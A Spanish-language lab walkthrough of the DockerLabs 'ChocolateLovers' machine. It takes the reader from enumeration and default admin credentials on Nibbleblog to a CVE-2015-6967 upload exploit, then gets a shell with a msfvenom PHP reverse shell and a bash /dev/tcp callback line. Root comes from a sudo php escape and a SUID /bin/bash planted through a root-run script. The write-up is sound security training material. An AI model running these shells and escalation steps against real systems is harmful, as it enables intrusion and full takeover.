Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "ChocolateLovers".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh chocolatelovers.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene abierto el puerto 80 (HTTP):
```
Discovered open port 80/tcp on 172.17.0.2
```
Por lo que pondremos en el navegador la IP para ver que informacion podemos sacar, pero desgraciadamente, no hay nada interesante.
Es momento ahora de hacer un poco de FUZZING WEB para tener mas opciones, usando por ejemplo, "gobuster":
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,asp,aspx,jsp,html -t 20
```
Sin embargo, no hay nada interesante salvo un "/index.html" que nos lleva a una pagina en matenimiento.
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 11093]
/.php                 (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
```
Habiendo probado ya esto, volvemos a la pagina "principal", y entramos al codigo fuente con "CTRL + U"

Aqui vemos algo que nos llama la atencion y es que son varias las veces que encontramos escrito: "<! - - /nibbleblog - - >", por lo que vamos a probar si podemos obtener algo con ello escribiendolo a continuacion de la IP, y.... BINGOOOO !! Encontramos a una pagina algo distinta donde nos da la bienvenida al propio Nibbleblog  y donde, entre otras cosas, vemos el siguiente mensaje:
```
Start publishing from your dashboard http://172.17.0.2/nibbleblog/admin.php
```
Por lo que probaremos a seguir el enlace haciendo pinchando sobre el, lo que nos lleva a un panel de login, asi que probaremos con las credenciales tipicas antes de intentar cualquier otra cosa.
Casualmente, la primera que he probado, "admin/admin" ha funcionado.

Viendo que entramos al panel de control, vamos directamente a General Settings para ver si podemos sacar informacion y vemos que la version de Nibbleblog instalada es la 4.0.3

Sabiendo esto, vamos a buscar en github si existe alguna vulnerabilidad, hecho lo cual, vemos que hay una.

En mi caso he ido al siguiente enlace de github:
https://github.com/dix0nym/CVE-2015-6967
de donde clonaremos el repositorio:
```
git clone https://github.com/dix0nym/CVE-2015-6967.git
```
Una vez clonado, vemos que su uso es el siguiente:
```
usage: exploit.py [-h] --url URL --username USERNAME --password PASSWORD --payload PAYLOAD

optional arguments:
  -h, --help            show this help message and exit
  --url URL, -l URL
  --username USERNAME, -u USERNAME
  --password PASSWORD, -p PASSWORD
  --payload PAYLOAD, -x PAYLOAD

Y como ejemplo tenemos:
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
```
Bien, tomando esto como referencia, lo que vamos a hacer es crear con "msfvenom" una "reverse.php"
```
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > reverse.php
```
Una vez obtenido el archivo "reverse.php" pasamos a abrir un terminal para ponernos a la escucha con NETCAT por el puerto 443 en este caso y lanzaremos el exploit:
```
python3 exploit.py --url http://172.17.0.2/nibbleblog/ --username admin --password admin --payload reverse.php
[+] Login Successful.
[-] Upload likely failed.
[!] Exploit failed.
```
Pero tal y como se ve, el exploit falla. ¿Y por que? Facil, parece ser que la vulnerabilidad tiene que ver con el plugin de Nibbleblog "My Image", el cual NO esta instalado, por lo que lo instalaremos.

Una vez hecho, volvemos a ponernos a la escucha con NETCAT por el puerto 443 y de nuevo probamos con el comando anterior, el cual esta vez SI funciona tal y como se ve a continuacion:
```
TERMINAL PARA EJECUTAR EL PAYLOAD:

python3 exploit.py --url http://172.17.0.2/nibbleblog/ --username admin --password admin --payload reverse.php
[+] Login Successful.
[+] Upload likely successfull.   <=== Esta vez todo perfecto


TERMINAL DONDE ESTAMOS ESCUCHANDO CON NETCAT

nc -nlvp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33838
whoami
www-data
```
Como hemos usado "msfvenom" con una shell en formato ".php", esta no suele ser muy estable, por lo que abriremos en otra terminal otro NETCAT por el puerto 444 para estabilizar la conexion.

En la terminal del primer NETCAT escribimos entonces:
```
bash -c "sh -i >& /dev/tcp/172.17.0.1/444 0>&1"  <=== Tipica
```
Y ahora si, ya tenemos la conexion estabilizada en nuestra nueva terminal. El resto ya se podrian cerrar para quedarnos unicamente con esta ultima activa.

Es momento ahora de hacer el tratamiento de la TTY, por lo que seguiremos estos pasos:
```
1) Escribimos:
	script /dev/null -c bash
2) Ahora pulsamos (CTRL + Z) y nos devuele a la terminal de la maquina atacante
3) Escribimos:
	stty raw -echo; fg
4) Una vez escrito lo anterior y vuelto a la maquina victima, escribimos:
	reset xterm
5) Finalmente, escribimos estos dos comandos:                    
    export TERM=xterm
    export SHELL=bash
6) Nos quedaria la terminal de la siguiente forma:
	www-data@c306b3822817:/var/www/html$ 
```
Es momento ahora de hacer un "cd /" para ir al directorio raiz:
```
www-data@53305a206d4f:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /

www-data@53305a206d4f:/$ ls
bin   dev  home  lib32	libx32	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 lib64	media	opt  root  sbin  sys  usr

www-data@53305a206d4f:/$ whoami
www-data

www-data@53305a206d4f:/$ 

```
Bien, en principio solo quedaria la escalada de privilegios, por lo que empezaremos poniendo "sudo -l" para ver si hay suerte, y vemos lo siguiente:
```
www-data@53305a206d4f:/$ sudo -l

Matching Defaults entries for www-data on 53305a206d4f:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on 53305a206d4f:
    (chocolate) NOPASSWD: /usr/bin/php
    
www-data@53305a206d4f:/$ 

```
Hay un usuario que se llama "chocolate" que puede ejecutar el binario "/usr/bin/php".

Antes de seguir y ya que estamos, hacemos "cat /etc/passwd" para ver si hay mas usuarios, pero vemos que no:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
chocolate:x:1000:1000::/home/chocolate:/bin/bash  <=== El que nos interesa
```
Habia que asegurarse, asi que... :).

Bueno, volviendo al usuario "chocolate", vamos a buscar en la pagina de "gtfobins" o en mi caso, con el comando "searchbins" como ejecutar el binario "php" como "sudo":
```
searchbins -b php -f sudo

[+] Binary: php

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/php/#sudo]

	| CMD="/bin/sh"
	| sudo php -r "system('$CMD');"
```
Asi que probamos en la maquina victima a escribir:
```
CMD="/bin/sh"
sudo -u chocolate /usr/bin/php -r "system('$CMD');"
```
Si ponemos ahora "whoami" obtenemos que somos el usuario "chocolate", y poniendo "bash -p", obtenemos un prompt "normal":
```
whoami
chocolate

bash -p
chocolate@53305a206d4f:/$
```
El problema es que si ponemos ahora "sudo -l", nos pide la contraseña del usuario "chocolate" (la cual no sabemos), asi que nada por este lado.

Probamos entonces con "find / -perm -4000 2>/dev/null" y mas de lo mismo.

Entonces ahora, ¿que podemos hacer? Pues es hora de mirar los procesos que hay corriendo en segundo plano con el comando:
```
ps -faux
```
Y vemos que el usuario "root" esta usando un servicio "php" un tanto extraño que esta ejecutando cada 5 segundos ("sleep 5"):
```
USER  PID %CPU %MEM    VSZ   RSS TTY STAT START   TIME COMMAND
root  1  0.0  0.0   2616  1408 ?     Ss   10:47   0:00 /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done
```
Teniendo en cuenta que el usuario "chocolate" podia usar el binario "php" sin permisos, se me ocurre que podriamos probar ese "script.php" a ver de quien es:
```
ls -l /opt/script.php
```
Y tal y como sospechabamos, sus permisos pertenecen al usuario "chocolate":
```
-rw-r--r-- 1 chocolate chocolate 59 May  7 13:55 /opt/script.php
```
Viendo que lo esta ejecutando el usuario "root" cada 5sg de forma automatica y que pertenece al usuario "chocolate", lo que deberiamos hacer ahora es bastante sencillo.

Editarlo, modificarlo para darle permisos "SUID" a "/bin/bash" y esperar 5sg a que se "autoejecute" gracias al usuario "root" ;) !!

Escribimos entonces en el terminal:
```
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```
Esperamos y ejecutamos:
```
ls -l /bin/bash
```
obteniendo como resultado un cambio en los permisos:
```
chocolate@53305a206d4f:/$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash  <==== Atentos a esa "s"
```
Ahora con un "bash -p" vemos que ya somos "root":
```
bash-5.0# whoami
root

bash-5.0#
```
Y con esto, la maquina estaria acabada.

***NOTA: En mi caso particular, y a pesar de estar definida como una maquina "facil", me ha parecido algo mas complicadilla de lo habitual, al nivel de una de dificultad "media".***

